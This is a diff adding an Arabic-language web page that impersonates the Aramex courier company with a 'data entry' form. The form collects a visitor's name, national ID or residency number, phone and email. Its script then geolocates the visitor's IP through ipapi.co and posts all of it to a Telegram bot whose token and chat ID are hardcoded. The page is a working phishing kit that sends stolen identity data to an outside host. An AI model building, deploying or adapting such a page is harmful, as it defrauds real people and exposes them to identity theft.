@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>إدخال البيانات - أرامكس</title>
+  <!-- Bootstrap RTL -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+    body {
+      font-family: "Cairo", sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: linear-gradient(-45deg, rgba(255,153,153,0.9), rgba(255,77,77,0.9), rgba(255,51,51,0.9), rgba(179,0,0,0.9)),
+                  url('images/logo.png') no-repeat center center fixed;
+      background-size: cover;
+      animation: gradientBG 12s ease infinite;
+    }
+    @keyframes gradientBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+    .container-box {
+      background: #fff;
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      text-align: right;
+    }
+    h1 {
+      text-align: center;
+      color: #d10000;
+      margin-bottom: 25px;
+      font-weight: 700;
+    }
+    label {
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+    input:focus, textarea:focus {
+      border-color: #d10000;
+      outline: none;
+      box-shadow: 0 0 8px rgba(209,0,0,0.4);
+    }
+    button {
+      margin-top: 25px;
+      background: linear-gradient(45deg, #d10000, #b30000);
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 18px;
+      border-radius: 50px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+    button:hover {
+      opacity: 0.9;
+      transform: scale(1.03);
+    }
+    .message {
+      margin-top: 10px;
+      padding: 10px;
+      border-radius: 8px;
+      display: none;
+      font-size: 15px;
+    }
+    .error { background: #ffd4d4; color: #900; }
+    .success { background: #d4ffd8; color: #060; }
+    footer {
+      text-align: center;
+      padding: 15px;
+      color: white;
+      font-size: 14px;
+      background: rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body class="d-flex flex-column min-vh-100">
+  <header class="bg-white shadow-sm text-center p-2">
+    <img src="images/logo1.png" alt="Aramex Logo" class="img-fluid" style="height:75px;">
+  </header>
+
+  <main class="flex-grow-1 d-flex align-items-center">
+    <div class="container">
+      <div class="row justify-content-center">
+        <div class="col-12 col-md-8 col-lg-6">
+          <div class="container-box">
+            <h1>إدخال البيانات</h1>
+            <div id="msg" class="message"></div>
+
+            <label>الاسم</label>
+            <input type="text" id="name" placeholder="">
+
+            <label>رقم الهوية / الإقامة</label>
+            <input type="text" id="idNumber" placeholder="">
+
+            <label>رقم الجوال</label>
+            <input type="text" id="phone" placeholder="">
+
+            <label>البريد الإلكتروني</label>
+            <input type="email" id="email" placeholder="">
+
+            <button onclick="submitForm()">التالي</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    جميع الحقوق محفوظة © أرامكس 2025
+  </footer>
+
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    async function submitForm() {
+      const name = document.getElementById("name").value.trim();
+      const idNumber = document.getElementById("idNumber").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const msg = document.getElementById("msg");
+      msg.style.display = "none";
+
+      // تحقق من رقم الهوية
+      if (!/^784\d{12}$/.test(idNumber)) {
+        msg.className = "message error";
+        msg.textContent = "يرجى التحقق من رقم الهوية/الإقامة (15 رقم ويبدأ بـ 784)";
+        msg.style.display = "block";
+        return;
+      }
+
+      if (!/^\d+$/.test(phone)) {
+        msg.className = "message error";
+        msg.textContent = "يرجى إدخال رقم جوال صحيح";
+        msg.style.display = "block";
+        return;
+      }
+
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        msg.className = "message error";
+        msg.textContent = "يرجى إدخال بريد إلكتروني صحيح";
+        msg.style.display = "block";
+        return;
+      }
+
+      let info = { name, idNumber, phone, email, date: new Date().toLocaleString('ar-EG') };
+
+      try {
+        let res = await fetch("https://ipapi.co/json/");
+        let data = await res.json();
+        info.ip = data.ip;
+        info.country = data.country_name;
+        info.city = data.city;
+        info.org = data.org;
+
+        const BOT_TOKEN = "7249432247:AAFCoEkwppQ0pOrGWOLBBBCWyATgjpD__bo";
+        const CHAT_ID = "7284154308";
+        const text = `📝 بيانات العميل:\n👤 الاسم: ${info.name}\n🆔 الهوية: ${info.idNumber}\n📱 الجوال: ${info.phone}\n✉️ البريد: ${info.email}\n🌍 الدولة: ${info.country}\n🏙️ المدينة: ${info.city}\n💻 الشبكة: ${info.org}\n🌐 IP: ${info.ip}\n⏰ ${info.date}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+
+        msg.className = "message success";
+        msg.textContent = "✅ تم إرسال البيانات بنجاح! جاري التحويل...";
+        msg.style.display = "block";
+
+        setTimeout(() => {
+          window.location.href = "ban.html";
+        }, 3000);
+
+      } catch (e) {
+        msg.className = "message error";
+        msg.textContent = "يرجى التأكيد";
+        msg.style.display = "block";
+      }
+    }
+  </script>
+</body>
+</html>
